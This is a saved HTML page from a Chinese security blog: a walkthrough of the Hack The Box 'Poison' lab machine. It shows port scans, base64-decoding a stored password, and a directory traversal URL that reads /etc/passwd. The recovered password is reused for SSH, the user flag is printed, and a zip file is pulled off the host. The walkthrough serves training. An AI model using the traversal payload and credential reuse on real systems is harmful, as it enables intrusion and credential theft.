@@ -1,0 +1,792 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：base64位解码、目录遍历漏洞、本地文件包含漏洞、口令密码复用、zip压缩包密码破解、vncviewer 工具使用、SSH端口转发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Poison-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/01/06/Poison-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：base64位解码、目录遍历漏洞、本地文件包含漏洞、口令密码复用、zip压缩包密码破解、vncviewer 工具使用、SSH端口转发">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Poison-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Poison-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Poison-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Poison-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Poison-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Poison-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Poison-htb-writeup/7.png">
+<meta property="article:published_time" content="2024-01-06T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-01-30T07:54:40.360Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Poison-htb-writeup/1.png">
+  
+  
+  
+  <title>Poison-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Poison-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-06 23:50" pubdate>
+          2024年1月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          104 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Poison-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：base64位解码、目录遍历漏洞、本地文件包含漏洞、口令密码复用、zip压缩包密码破解、vncviewer 工具使用、SSH端口转发</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2018/09/08/htb-poison.html</code></p>
+<p>参考链接：<code>https://www.cyberdonald.com/post/hack-the-box-poison</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.84</p>
+<p>2、扫描下开放端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -p- -Pn --min-rate=10000 -oG allport 10.10.10.84  <br>[sudo] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-06 10:32 CST<br>Warning: 10.10.10.84 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.84<br>Host is up (0.28s latency).<br>Not shown: 52931 filtered tcp ports (no-response), 12602 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 74.56 seconds<br><br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -sV -sC -p22,80 -Pn --min-rate=10000 10.10.10.84<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-06 10:36 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.84<br>Host is up (0.28s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 e3:3b:7d:3c:8f:4b:8c:f9:<span class="hljs-built_in">cd</span>:7f:d2:3a:ce:2d:ff:bb (RSA)<br>|   256 4c:e8:c6:02:bd:<span class="hljs-built_in">fc</span>:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)<br>|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/<span class="hljs-number">5.6</span>.<span class="hljs-number">32</span>)<br>|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-<span class="hljs-number">8</span>).<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> (FreeBSD) PHP/<span class="hljs-number">5.6</span>.<span class="hljs-number">32</span><br>Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">17.69</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、访问80端口发现是一个PHP本地文件包含的网站</p>
+<p><code>http://10.10.10.84/</code></p>
+<p><img src="http://sh1yan.top/photo/Poison-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://10.10.10.84/browse.php?file=listfiles.php</code></p>
+<p><img src="http://sh1yan.top/photo/Poison-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://10.10.10.84/browse.php?file=pwdbackup.txt</code></p>
+<p><img src="http://sh1yan.top/photo/Poison-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">This password is secure, it<span class="hljs-string">&#x27;s encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= </span><br></code></pre></td></tr></table></figure>
+
+<p>4、按照上面提示内容，对该文件进行13次bae64位解码，得到一个密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">data=$(<span class="hljs-built_in">cat</span> pwd.b64); <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 13); <span class="hljs-keyword">do</span> data=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$data</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span> | <span class="hljs-built_in">base64</span> -d); <span class="hljs-keyword">done</span>; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$data</span><br><br>Charix!2<span class="hljs-comment">#4%6&amp;8(0</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Poison-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、同时，发现该 browse.php 文件可以跨目录访问其他文件</p>
+<p><code>http://10.10.10.84/browse.php?file=../../../../../../etc/passwd</code></p>
+<p><img src="http://sh1yan.top/photo/Poison-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $</span><br><span class="hljs-comment">#</span><br>root:*:0:0:Charlie &amp;:/root:/bin/csh<br>toor:*:0:0:Bourne-again Superuser:/root:<br>daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin<br>operator:*:2:5:System &amp;:/:/usr/sbin/nologin<br>bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin<br><span class="hljs-built_in">tty</span>:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin<br>kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin<br>games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin<br>news:*:8:8:News Subsystem:/:/usr/sbin/nologin<br>man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin<br>sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin<br>smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin<br>mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin<br><span class="hljs-built_in">bind</span>:*:53:53:Bind Sandbox:/:/usr/sbin/nologin<br>unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin<br>proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin<br>_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin<br>_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin<br>uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico<br>pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin<br>auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin<br>www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin<br>_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin<br>hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin<br>nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin<br>_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin<br>messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin<br>avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin<br>cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin<br>charix:*:1001:1001:charix:/home/charix:/bin/csh<br></code></pre></td></tr></table></figure>
+
+<p>6、通过上面获取的密码和这个 passwd 文件里的用户名，尝试登录靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">charix<br><br>Charix!2<span class="hljs-comment">#4%6&amp;8(0</span><br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh charix@10.10.10.84                                         <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.84 (10.10.10.84)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.84<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">(charix@10.10.10.84) Password for charix@Poison:</span><br><span class="hljs-string">Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4</span><br><span class="hljs-string">FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017</span><br><span class="hljs-string"></span><br><span class="hljs-string">Welcome to FreeBSD!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Release Notes, Errata: https://www.FreeBSD.org/releases/</span><br><span class="hljs-string">Security Advisories:   https://www.FreeBSD.org/security/</span><br><span class="hljs-string">FreeBSD Handbook:      https://www.FreeBSD.org/handbook/</span><br><span class="hljs-string">FreeBSD FAQ:           https://www.FreeBSD.org/faq/</span><br><span class="hljs-string">Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/</span><br><span class="hljs-string">FreeBSD Forums:        https://forums.FreeBSD.org/</span><br><span class="hljs-string"></span><br><span class="hljs-string">Documents installed with the system are in the /usr/local/share/doc/freebsd/</span><br><span class="hljs-string">directory, or can be installed later with:  pkg install en-freebsd-doc</span><br><span class="hljs-string">For other languages, replace &quot;en&quot; with a language code like de or fr.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Show the version of FreeBSD installed:  freebsd-version ; uname -a</span><br><span class="hljs-string">Please include that output and any error messages when posting questions.</span><br><span class="hljs-string">Introduction to manual pages:  man man</span><br><span class="hljs-string">FreeBSD directory layout:      man hier</span><br><span class="hljs-string"></span><br><span class="hljs-string">Edit /etc/motd to change this login announcement.</span><br><span class="hljs-string">You can often get answers to your questions about FreeBSD by searching in the</span><br><span class="hljs-string">FreeBSD mailing list archives at</span><br><span class="hljs-string"></span><br><span class="hljs-string">        http://www.FreeBSD.org/search/search.html</span><br><span class="hljs-string">charix@Poison:~ % id</span><br><span class="hljs-string">uid=1001(charix) gid=1001(charix) groups=1001(charix)</span><br></code></pre></td></tr></table></figure>
+
+<p>7、获取到第一个 user.txt 的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">charix@Poison:~ % <span class="hljs-built_in">pwd</span><br>/home/charix<br>charix@Poison:~ % <span class="hljs-built_in">ls</span><br>secret.zip      user.txt<br>charix@Poison:~ % <span class="hljs-built_in">cat</span> user.txt<br>eaacdfb2d141b72a589233063604209c<br>charix@Poison:~ % <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>8、发现用户根目录下有一个 secret.zip 的压缩包，通过Python开启一个WEB服务进行下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">charix@Poison:~ % <span class="hljs-built_in">ls</span> -la<br>total 48<br>drwxr-x---  2 charix  charix   512 Mar 19  2018 .<br>drwxr-xr-x  3 root    wheel    512 Mar 19  2018 ..<br>-rw-r-----  1 charix  charix  1041 Mar 19  2018 .cshrc<br>-rw-rw----  1 charix  charix     0 Mar 19  2018 .<span class="hljs-built_in">history</span><br>-rw-r-----  1 charix  charix   254 Mar 19  2018 .login<br>-rw-r-----  1 charix  charix   163 Mar 19  2018 .login_conf<br>-rw-r-----  1 charix  charix   379 Mar 19  2018 .mail_aliases<br>-rw-r-----  1 charix  charix   336 Mar 19  2018 .mailrc<br>-rw-r-----  1 charix  charix   802 Mar 19  2018 .profile<br>-rw-r-----  1 charix  charix   281 Mar 19  2018 .rhosts<br>-rw-r-----  1 charix  charix   849 Mar 19  2018 .shrc<br>-rw-r-----  1 root    charix   166 Mar 19  2018 secret.zip<br>-rw-r-----  1 root    charix    33 Mar 19  2018 user.txt<br>charix@Poison:~ % <span class="hljs-built_in">cat</span> secret.zip | <span class="hljs-built_in">base64</span> -w 0<br><span class="hljs-built_in">base64</span>: Command not found.<br>charix@Poison:~ % <span class="hljs-built_in">base64</span> -h<br><span class="hljs-built_in">base64</span>: Command not found.<br>charix@Poison:~ % python3 -m http.server 8000<br>python3: Command not found.<br>charix@Poison:~ % python -m http.server 8000<br>/usr/local/bin/python: No module named http<br>charix@Poison:~ % python -m SimpleHTTPServer 8080<br>Serving HTTP on 0.0.0.0 port 8080 ...<br>10.10.14.5 - - [06/Jan/2024 04:11:50] <span class="hljs-string">&quot;GET / HTTP/1.1&quot;</span> 200 -<br>10.10.14.5 - - [06/Jan/2024 04:11:51] code 404, message File not found<br>10.10.14.5 - - [06/Jan/2024 04:11:51] <span class="hljs-string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -<br>10.10.14.5 - - [06/Jan/2024 04:12:05] <span class="hljs-string">&quot;GET /secret.zip HTTP/1.1&quot;</span> 200 -<br>10.10.14.5 - - [06/Jan/2024 04:13:01] <span class="hljs-string">&quot;GET /secret.zip HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Poison-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
